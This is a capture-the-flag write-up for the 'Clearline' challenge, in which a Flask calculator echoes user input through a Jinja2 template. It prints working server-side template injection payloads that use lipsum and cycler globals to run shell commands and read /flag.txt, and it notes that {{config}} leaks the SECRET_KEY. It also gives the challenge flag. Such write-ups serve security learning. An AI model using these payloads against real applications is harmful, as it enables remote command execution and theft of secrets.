# Clearline

> **Category:** Beginner / PPC · **Event:** KubSTU CTF 2026 Autumn
> Author team: mpei_larpers · Source: https://ctftime.org/writeup/41131 (CTFtime community writeup)

## 📌 Task

http://159.194.244.226:8082/ — "CLEARLINE - Expression Console". A single input field that evaluates arithmetic under a strict grammar: numbers, `+ - * / // % **`, parentheses, unary signs; the exponent is capped at 64, intermediate values stay below 2**4096, and input is limited to 512 characters. The evaluator itself is done honestly: names, calls, attributes and strings are cut off at the AST level, and random diff-fuzzing of 700 expressions against local CPython found no discrepancy at all. Breaking the calculator is pointless.

## 🏁 Solution

The hole was not in the calculator but in the echo. The entered expression is printed back onto the page into the result panel, and that copy is rendered on the server as a Jinja2 template. The verdict ("this is not a numeric expression") does not matter at all — the render happens anyway:

```bash
curl 'http://159.194.244.226:8082/?expr={{7*7}}'
# in the Input line: 49
```

From here it is classic SSTI. Through Jinja's built-in globals `lipsum`/`cycler` and their `__globals__` you reach the os module, and that is already command execution:

```
?expr={{lipsum.__globals__['os'].popen('id').read()}}
    -> uid=1000(ctf) gid=1000(ctf) groups=1000(ctf),0(root)
```

The flag in the container is at /flag.txt (43 bytes, world-readable):

```
?expr={{lipsum.__globals__['os'].popen('cat /flag.txt').read()}}
    -> kubstu{cl34rl1n3_t3mpl4t3_1nj3ct_983a0807}
```

Along the way `{{config}}` leaked too — the entire Flask config together with the SECRET_KEY, so it was not only the render that was leaky. The flag was read once more through the `cycler.__init__.__globals__.os` chain — the value is the same.

**Flag:** `kubstu{cl34rl1n3_t3mpl4t3_1nj3ct_983a0807}`
